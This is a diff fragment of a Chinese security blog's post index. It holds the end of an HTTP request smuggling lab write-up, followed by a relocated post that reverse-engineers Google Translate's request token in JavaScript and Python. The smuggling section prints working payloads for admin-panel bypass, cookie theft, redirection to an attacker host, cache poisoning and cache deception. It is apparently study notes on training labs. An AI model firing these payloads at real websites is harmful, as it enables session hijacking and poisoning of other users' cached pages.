+<p>尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png" alt=""></p>
+<p>页面上有个搜索框，输入任意内容，会在页面上返回出来</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png" alt=""></p>
+<p>于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png" alt=""></p>
+<p>于是加入走私的请求，再尝试访问/admin发现成功</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png" alt=""></p>
+<h2 id="获取其他用户的cookie">获取其他用户的cookie</h2>
+<p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png" alt=""></p>
+<h2 id="HTTP-header导致的XSS">HTTP header导致的XSS</h2>
+<p><strong>场景</strong>：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png" alt=""></p>
+<h2 id="将重定向转变为任意重定向">将重定向转变为任意重定向</h2>
+<p><strong>场景</strong>：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
+<p>通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
+<p>走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="缓存投毒">缓存投毒</h2>
+<ul>
+<li>构造一个页面中写入恶意的内容，比如写入alert(document.cookie)</li>
+<li>发送请求走私的内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
+<ul>
+<li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li>
+<li>打开主页 ⇒ 导致xss</li>
+</ul>
+<h2 id="缓存欺骗">缓存欺骗</h2>
+<p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p>
+<ul>
+<li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li>
+<li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+<ul>
+<li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png" alt=""></p>
+<p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JS逆向系列一</title>
     <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</url>
     <content><![CDATA[<h3 id="谷歌学术镜像">谷歌学术镜像</h3>
@@ -444,88 +444,6 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
 所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现</p>
 <p>最终完成的效果<br>
 <img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>JS逆向</category>
-      </categories>
-      <tags>
-        <tag>JS逆向系列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JS逆向系列之谷歌翻译</title>
-    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</url>
-    <content><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3>
-<h4 id="分析过程">分析过程</h4>
-<ul>
-<li>首次分析</li>
-</ul>
-<p>首先找到谷歌翻译的Ajax请求接口</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p>
-<p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p>
-<ul>
-<li>通过断点逆向<code>tk</code>的加密算法</li>
-</ul>
-<p>加密算法应该在translate_m_zh-CN.js文件里</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p>
-<p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p>
-<p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p>
-<p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p>
-<ul>
-<li>分析生成<code>tk</code>的JS代码</li>
-</ul>
-<p>如下是我们刚获取的JS代码</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">&quot;&amp;&quot;</span> + d.join(<span class="string">&quot;&quot;</span>) + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    d = b.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>
-如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p>
-<h4 id="具体实现">具体实现</h4>
-<p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p>
-<ul>
-<li>Python脚本</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;google_tk.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.<span class="built_in">compile</span>(js)</span><br><span class="line">    tk = j.call(<span class="string">&#x27;pu&#x27;</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span>():</span></span><br><span class="line">    q = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的内容：&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://translate.google.cn/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot;</span> + get_tk(</span><br><span class="line">        q) + <span class="string">&quot;&amp;q=&quot;</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    translate_google()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>tk.js</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tkk = &#x27;441865.2154418832&#x27;;</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">&#x27;441865.2154418832&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h4 id="运行效果">运行效果</h4>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p>
-<h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3>
-<ul>
-<li>散列(hash)函数算法：MD5、SHA</li>
-<li>对称加密算法：DES、3DES、AES</li>
-<li>非对称性加密算法：RSA、DSA、ECC</li>
-</ul>
-<h4 id="散列-hash-函数算法">散列(hash)函数算法</h4>
-<ul>
-<li>简介</li>
-</ul>
-<p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure>
-<ul>
-<li>特点</li>
-</ul>
-<p>一、不可逆，与原视数据没有对应关系<br>
-二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>
-三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p>
-<h4 id="对称加密算法">对称加密算法</h4>
-<ul>
-<li>简介</li>
-</ul>
-<p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p>
-<h4 id="非对称性加密算法">非对称性加密算法</h4>
-<ul>
-<li>简介</li>
-</ul>
-<p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>
 ]]></content>
       <categories>
         <category>JS逆向</category>
@@ -817,6 +735,88 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </tags>
   </entry>
   <entry>
+    <title>JS逆向系列之谷歌翻译</title>
+    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</url>
+    <content><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3>
+<h4 id="分析过程">分析过程</h4>
+<ul>
+<li>首次分析</li>
+</ul>
+<p>首先找到谷歌翻译的Ajax请求接口</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p>
+<p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p>
+<ul>
+<li>通过断点逆向<code>tk</code>的加密算法</li>
+</ul>
+<p>加密算法应该在translate_m_zh-CN.js文件里</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p>
+<p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p>
+<p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p>
+<p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p>
+<ul>
+<li>分析生成<code>tk</code>的JS代码</li>
+</ul>
+<p>如下是我们刚获取的JS代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">&quot;&amp;&quot;</span> + d.join(<span class="string">&quot;&quot;</span>) + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    d = b.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ 